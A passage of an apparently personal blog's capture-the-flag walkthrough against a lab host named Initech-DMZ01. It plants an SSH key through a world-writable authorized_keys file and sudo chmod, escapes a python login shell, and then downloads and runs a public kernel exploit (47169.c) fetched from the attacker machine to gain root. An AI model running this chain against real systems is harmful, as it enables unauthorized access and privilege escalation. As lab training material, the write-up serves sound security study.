+
+<p>The user samir can run the chmod command as sudo with privileges of user thebobs.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>samir@Initech-DMZ01:/home/thebobs<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>samir on Initech-DMZ01:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+
+User samir may run the following commands on Initech-DMZ01:
+    <span class="o">(</span>thebobs<span class="o">)</span> NOPASSWD: /bin/chmod
+</code></pre></div></div>
+
+<p>In the thebobs home directory into the ssh directory the authorized_keys file has write privileges for all users, I could use it to save a public key.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>samir@Initech-DMZ01:/home/thebobs<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> .ssh
+total 68
+drwxrwxrwx 2 thebobs thebobs  4096 Nov 13  2016 <span class="nb">.</span>
+drwxr-xr-x 4 thebobs thebobs  4096 Oct 18 18:20 ..
+<span class="nt">-rwx------</span> 1 thebobs thebobs 12288 Nov 13  2016 .swm
+<span class="nt">-rwx------</span> 1 thebobs thebobs 12288 Nov 13  2016 .swn
+<span class="nt">-rwx------</span> 1 thebobs thebobs 12288 Nov 13  2016 .swo
+<span class="nt">-rwx------</span> 1 thebobs thebobs 12288 Nov 13  2016 .swp
+<span class="nt">-rwxrwxrwx</span> 1 thebobs thebobs     0 Nov 13  2016 authorized_keys
+<span class="nt">-rwxrwxrwx</span> 1 thebobs thebobs  1679 Sep 10  2016 id_rsa
+<span class="nt">-rwxrwxrwx</span> 1 thebobs thebobs   403 Sep 10  2016 id_rsa.pub
+<span class="nt">-rwxrwxrwx</span> 1 thebobs thebobs   222 Oct  6  2016 known_hosts
+</code></pre></div></div>
+
+<p>Reviewing the SSH configuration file, in the last lines we can see that only thebobs user can log in via SSH.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>samir@Initech-DMZ01:/home/thebobs<span class="nv">$ </span><span class="nb">tail</span> <span class="nt">-4</span> /etc/ssh/sshd_config
+UsePAM <span class="nb">yes
+
+</span>AllowUsers thebobs
+<span class="c">#AllowUsers root</span>
+</code></pre></div></div>
+
+<p>On the attacking machine I generate the SSH keys.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh-keygen <span class="nt">-P</span> <span class="s2">"s3cr3t"</span> <span class="nt">-f</span> id_rsa
+</code></pre></div></div>
+
+<p>The public key is stored in the authorized_keys file into the home directory of thebobs, then we grant all permissions only to the user thebobs, otherwise we cannot log in via SSH.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>samir@Initech-DMZ01:/home/thebobs<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDeNyJEoM7B3d+MwTbus8Q1zLP0x+BbdKMts2RhjtgyS7tWKwIMq/i2QPEHdE/oFnfDeS0bgCo/HaCX/o0zMXu+mg0n8QmTv+SLFexxHSSX0TsjjKMdB7UPWaZVXjmnxWvOHWcbnY8v5XOw+JZfQnFbeYpf/j8AxVvxNDhhBMKcOAibB1CNFzyqK46/3EFtMgfvclzSCcuJNYoT7n4VRo8NNsm8cFGPFUDT6HNNV5Jn40AP0iA3wRF9ZBpxyggktQjIk261YaszOwOjwYhXpvG1kNw5aX/FTMh23BSbeUZkcPEkOsnaVGoUBbxQsCWeZI8aFv6am7UsnJ5dyOA3pQCID6aMaC7M3Aoy+L9wH0g76VRk0KHR7udGz3DVXJhoq9i3VtSgEAfz7M3KueMoks4KLjwv93y8shEau+18zjjWK/EJ/ZoV39YmoUA1/b1iSqP+RSnI5sENQyDtCgH7UMrxZ9efDNh0+244vyZr2uV3kHkDGnB4GiV+z1LfzaU0Ak8= root@kali'</span> <span class="o">&gt;</span> .ssh/authorized_keys
+
+samir@Initech-DMZ01:/home/thebobs<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> thebobs /bin/chmod <span class="nt">-R</span> 700 .ssh/
+</code></pre></div></div>
+
+<p>Then we log in to the SSH service using the private key, thebobs is using python as shell, to bypass this I imported the os module to use the system funtion and execute bash.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh thebobs@192.168.179.150 <span class="nt">-i</span> id_rsa
+
+<span class="k">**********************************************************************</span>
+<span class="k">*</span>                                                                    <span class="k">*</span> 
+<span class="k">*</span>          The Bobs Cloud Hosting, LLC. Secure Backdoor              <span class="k">*</span>
+<span class="k">*</span>                                                                    <span class="k">*</span> 
+<span class="k">*</span>                                                                    <span class="k">*</span>
+<span class="k">*</span>  If you wish to discuss cloud hosting options, give us a call at   <span class="k">*</span>
+<span class="k">*</span>                                                                    <span class="k">*</span>
+<span class="k">*</span>   555-423-1800 or email us at thebobs@thebobscloudhostingllc.net   <span class="k">*</span>
+<span class="k">*</span>                                                                    <span class="k">*</span> 
+<span class="k">**********************************************************************</span>
+
+Enter passphrase <span class="k">for </span>key <span class="s1">'id_rsa'</span>: 
+Welcome to Ubuntu 14.04.5 LTS <span class="o">(</span>GNU/Linux 4.4.0-45-generic x86_64<span class="o">)</span>
+
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com/
+
+  System information as of Tue Sep 22 06:06:13 EDT 2021
+
+  System load: 1.25              Memory usage: 17%   Processes:       184
+  Usage of /:  98.3% of 5.80GB   Swap usage:   0%    Users logged <span class="k">in</span>: 0
+
+  <span class="o">=&gt;</span> / is using 98.3% of 5.80GB
+
+  Graph this data and manage this system at:
+    https://landscape.canonical.com/
+
+70 packages can be updated.
+44 updates are security updates.
+
+Your Hardware Enablement Stack <span class="o">(</span>HWE<span class="o">)</span> is supported <span class="k">until </span>April 2019.
+Last login: Tue Nov  8 13:36:07 2016 from 192.168.110.129
+Python 2.7.6 <span class="o">(</span>default, Jun 22 2015, 17:58:13<span class="o">)</span> 
+<span class="o">[</span>GCC 4.8.2] on linux2
+Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
+<span class="o">&gt;&gt;&gt;</span> import os
+<span class="o">&gt;&gt;&gt;</span> os.system<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span>
+thebobs@Initech-DMZ01:~<span class="nv">$ </span><span class="nb">ls
+</span>flag1
+thebobs@Initech-DMZ01:~<span class="nv">$ </span><span class="nb">cat </span>flag1 
+breach3<span class="o">{</span>the_dmz_is_burning<span class="o">}</span>
+</code></pre></div></div>
+
+<p>I found a virtual interface with another network segment.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thebobs@Initech-DMZ01:~<span class="nv">$ </span>ip addr
+...
+3: virbr0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000
+    <span class="nb">link</span>/ether fe:54:00:4b:73:5f brd ff:ff:ff:ff:ff:ff
+    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0
+       valid_lft forever preferred_lft forever
+...
+</code></pre></div></div>
+
+<p>Listing the ARP cache I found two ip addresses, these belong to the virtal interface, but I couldn’t interact with them.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thebobs@Initech-DMZ01:~<span class="nv">$ </span>arp
+Address                  HWtype  HWaddress           Flags Mask            Iface
+192.168.179.1            ether   00:50:56:c0:00:01   C                     eth0
+192.168.122.65           ether   52:54:00:ee:14:51   C                     virbr0
+192.168.122.28           ether   52:54:00:f7:3c:ef   C                     virbr0
+</code></pre></div></div>
+
+<p>This kernel version seems to be vulnerable so I will checked it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thebobs@Initech-DMZ01:~<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
+Linux Initech-DMZ01 4.4.0-45-generic <span class="c">#66~14.04.1-Ubuntu SMP Wed Oct 19 15:05:38 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="kernel-exploit">Kernel Exploit</h3>
+
+<p>To this kernel version I found an exploit that takes advantage of a memory corruption flaw. The append path can be erroneously switched from UFO to non-UFO in ip_ufo_append_data() when building an UFO packet with MSG_MORE option. If unprivileged user namespaces are available, this flaw can be exploited to gain root privileges.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit 4.4.0                                                                                                                             
+<span class="nt">----------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">--------------------</span>
+ Exploit Title                                                                                                                    |  Path 
+<span class="nt">----------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">--------------------</span>
+...
+Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 <span class="o">(</span>Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin<span class="o">)</span> - Local Privilege Escalation <span class="o">(</span>KASLR / SMEP<span class="o">)</span>         | linux/local/47169.c
+...
+<span class="nt">----------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">--------------------</span>
+</code></pre></div></div>
+
+<p>I performed a copy of this exploit to my current directory, compiled it and started a python web server.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit <span class="nt">-m</span> linux/local/47169.c
+
+root@kali:~<span class="nv">$ </span>gcc 47169.c <span class="nt">-o</span> pwn
+root@kali:~<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 22
+</code></pre></div></div>
+
+<p>Then I downloaded it to the target machine, gave it execution privileges and ran it, and we got root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thebobs@Initech-DMZ01:~<span class="nv">$ </span>wget 192.168.179.1:22/pwn
+thebobs@Initech-DMZ01:~<span class="nv">$ </span><span class="nb">chmod</span> +x pwn
+thebobs@Initech-DMZ01:~<span class="nv">$ </span>./pwn 
+<span class="o">[</span>.] starting
+<span class="o">[</span>.] checking kernel version
+<span class="o">[</span>.] kernel version <span class="s1">'4.4.0-45-generic'</span> detected
+<span class="o">[</span>~] <span class="k">done</span>, version looks good
+<span class="o">[</span>.] checking SMEP and SMAP
+<span class="o">[</span>~] <span class="k">done</span>, looks good
+<span class="o">[</span>.] setting up namespace sandbox
+<span class="o">[</span>~] <span class="k">done</span>, namespace sandbox <span class="nb">set </span>up
+<span class="o">[</span>.] KASLR bypass enabled, getting kernel addr
+<span class="o">[</span>.] trying /proc/kallsyms...
+<span class="o">[</span>.] trying /boot/System.map-4.4.0-45-generic...
+<span class="o">[</span>-] open/read<span class="o">(</span>/boot/System.map-4.4.0-45-generic<span class="o">)</span>
+<span class="o">[</span>.] trying syslog...
+<span class="o">[</span>~] <span class="k">done</span>, kernel addr:   ffffffff81000000
+<span class="o">[</span>.] commit_creds:        ffffffff8109d870
+<span class="o">[</span>.] prepare_kernel_cred: ffffffff8109db50
+<span class="o">[</span>.] SMEP bypass enabled, mmapping fake stack
+<span class="o">[</span>~] <span class="k">done</span>, fake stack mmapped
+<span class="o">[</span>.] executing payload ffffffff8104510a
+<span class="o">[</span>~] <span class="k">done</span>, should be root now
+<span class="o">[</span>.] checking <span class="k">if </span>we got root
+<span class="o">[</span>+] got r00t ^_^
+root@Initech-DMZ01:~# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <footer>
+<!--	  <div class="dashed"></div> -->
+    <ul class="horizontal-list">
+  
+</ul>
+
+  </footer>
+
+
+        
+          <button title="Toggle Theme" class="theme-toggle">
+  <svg viewBox="0 0 32 32" width="24" height="24" fill="currentcolor">
+    <circle cx="16" cy="16" r="14" fill="none" stroke="currentcolor" stroke-width="4"></circle>
+    <path d="
+             M 16 0
+             A 16 16 0 0 0 16 32
+             z">
+    </path>
+  </svg>
+</button>
+
+        
+        <div class="credits">&copy;&nbsp;2022&nbsp;s4rgaz
+          &nbsp;
+		  •
+          &nbsp;<!--Powered by <a href="https://www.soopr.co" target="_blank" rel="noreferrer">Soopr</a>
+          &nbsp;
+		  •
+          &nbsp;-->
+		  <!--Theme&nbsp; <a href="https://github.com/abhinavs/moonwalk" target="_blank" rel="noreferrer">Moonwalk</a>-->
+		  RSS&nbsp; <a href="/feed.xml" target="_blank" rel="noreferrer">Feed</a>
+        </div>
+      </div>
+    </main><script async defer src="https://sdk.soopr.co/soopr.js"></script></body>
+</html>
